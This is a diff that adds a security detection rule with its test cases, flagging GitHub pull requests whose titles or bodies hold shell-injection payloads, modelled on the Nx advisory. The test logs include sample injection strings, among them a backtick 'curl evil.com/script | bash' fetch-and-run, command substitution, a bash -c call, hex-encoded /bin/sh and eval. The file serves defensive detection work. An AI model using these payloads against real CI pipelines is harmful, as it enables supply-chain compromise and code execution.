@@ -1,0 +1,218 @@
+AnalysisType: rule
+Filename: github_malicious_pr_titles.py
+RuleID: "GitHub.Webhook.MaliciousPRTitles"
+DisplayName: "GitHub Malicious Pull Request Content"
+Enabled: true
+LogTypes:
+  - GitHub.Webhook
+Reports:
+  MITRE ATT&CK:
+    - TA0001:T1195.002  # Supply Chain Compromise: Compromise Software Supply Chain
+    - TA0002:T1072  # Execution: Software Deployment Tools
+Tags:
+  - Code Injection
+  - Supply Chain
+Severity: High
+Description: >
+  Detects malicious patterns in GitHub pull request content (title, body, head ref, head label,
+  default branch) that could indicate bash injection attempts or other malicious activity.
+  This rule is designed to catch attacks like the Nx vulnerability (GHSA-cxm3-wv7p-598c) where
+  PR titles contained bash injection payloads that could be executed by vulnerable CI workflows.
+  Lower severity for PRs that are not cross-fork.
+Runbook: |
+  1. Immediately review the pull request content and metadata for malicious patterns
+  2. Check if the repository has workflows that process PR titles or descriptions unsafely
+  3. Verify the identity and legitimacy of the PR author, especially for cross-fork PRs
+  4. Review recent workflow runs for signs of code execution or compromise
+  5. Check for any unusual repository activity or file modifications
+  6. Consider temporarily disabling vulnerable workflows until they can be secured
+  7. Implement input sanitization and use pull_request instead of pull_request_target
+  8. Report suspected supply chain attacks to security team
+Reference: https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c
+Tests:
+  - Name: PR with Command Substitution in Title
+    ExpectedResult: true
+    Log:
+      {
+        "action": "opened",
+        "number": 123,
+        "pull_request": {
+          "id": 789456123,
+          "number": 123,
+          "state": "open",
+          "title": "Fix build issue $(echo 'You have been compromised')",
+          "body": "This PR fixes the build configuration",
+          "draft": false,
+          "user": {
+            "login": "malicious-user",
+            "id": 12345,
+            "type": "User"
+          },
+          "head": {
+            "ref": "fix-build",
+            "sha": "abc123def456",
+            "repo": {
+              "full_name": "malicious-user/forked-repo",
+              "fork": true
+            }
+          },
+          "base": {
+            "ref": "main", 
+            "sha": "def456abc123",
+            "repo": {
+              "full_name": "target-org/main-repo",
+              "fork": false
+            }
+          },
+          "html_url": "https://github.com/target-org/main-repo/pull/123",
+          "created_at": "2024-01-15T10:30:00Z"
+        },
+        "repository": {
+          "name": "main-repo",
+          "full_name": "target-org/main-repo",
+          "private": false,
+          "fork": false
+        },
+        "sender": {
+          "login": "malicious-user",
+          "type": "User"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: PR with Backtick Command Substitution
+    ExpectedResult: true
+    Log:
+      {
+        "action": "opened",
+        "pull_request": {
+          "number": 456,
+          "title": "Update docs `curl -s evil.com/script | bash`",
+          "body": "Documentation updates",
+          "user": {
+            "login": "attacker"
+          },
+          "head": {
+            "repo": {
+              "full_name": "attacker/repo"
+            }
+          },
+          "base": {
+            "repo": {
+              "full_name": "victim-org/repo"
+            }
+          }
+        },
+        "repository": {
+          "full_name": "victim-org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: PR with Shell Invocation
+    ExpectedResult: true
+    Log:
+      {
+        "action": "opened",
+        "pull_request": {
+          "number": 505,
+          "title": "Update script /bin/bash -c 'malicious command'",
+          "body": "Script updates"
+        },
+        "repository": {
+          "full_name": "target/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Normal PR Title
+    ExpectedResult: false
+    Log:
+      {
+        "action": "opened",
+        "pull_request": {
+          "number": 999,
+          "title": "Add new feature for user authentication",
+          "body": "This PR adds OAuth support for user login",
+          "user": {
+            "login": "legitimate-dev"
+          },
+          "head": {
+            "repo": {
+              "full_name": "team/repo"
+            }
+          },
+          "base": {
+            "repo": {
+              "full_name": "team/repo"
+            }
+          }
+        },
+        "repository": {
+          "full_name": "team/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Non-PR Event
+    ExpectedResult: false
+    Log:
+      {
+        "action": "push",
+        "ref": "refs/heads/main",
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: PR Event Missing Pull Request Object
+    ExpectedResult: false
+    Log:
+      {
+        "action": "opened",
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: PR with Hex Encoding Attempt
+    ExpectedResult: true
+    Log:
+      {
+        "action": "opened",
+        "pull_request": {
+          "number": 666,
+          "title": "Update \\x2f62696e2f7368",
+          "body": "Binary update"
+        },
+        "repository": {
+          "full_name": "target/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: PR with Eval Command
+    ExpectedResult: true
+    Log:
+      {
+        "action": "opened",
+        "pull_request": {
+          "number": 777,
+          "title": "Config eval($malicious_code)",
+          "body": "Dynamic config"
+        },
+        "repository": {
+          "full_name": "target/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: PR Body with Eval Command
+    ExpectedResult: true
+    Log:
+      {
+        "action": "opened",
+        "pull_request": {
+          "number": 777,
+          "body": "Config eval($malicious_code)",
+          "title": "Dynamic config"
+        },
+        "repository": {
+          "full_name": "target/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
